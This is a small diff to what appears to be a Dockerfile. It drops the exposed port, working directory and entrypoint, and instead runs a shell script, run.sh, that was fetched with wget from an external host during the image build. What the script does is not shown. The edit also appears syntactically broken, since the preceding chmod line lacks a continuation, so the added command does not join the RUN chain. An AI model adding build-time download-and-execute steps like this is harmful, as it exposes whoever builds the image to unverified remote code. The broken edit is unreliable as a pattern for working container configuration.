@@ -10,8 +10,4 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/run.sh && \
     chmod 755 run.sh
-
-EXPOSE 5555
-
-WORKDIR /lite/build
-ENTRYPOINT ["./run.sh"]
+    sh ./run.sh
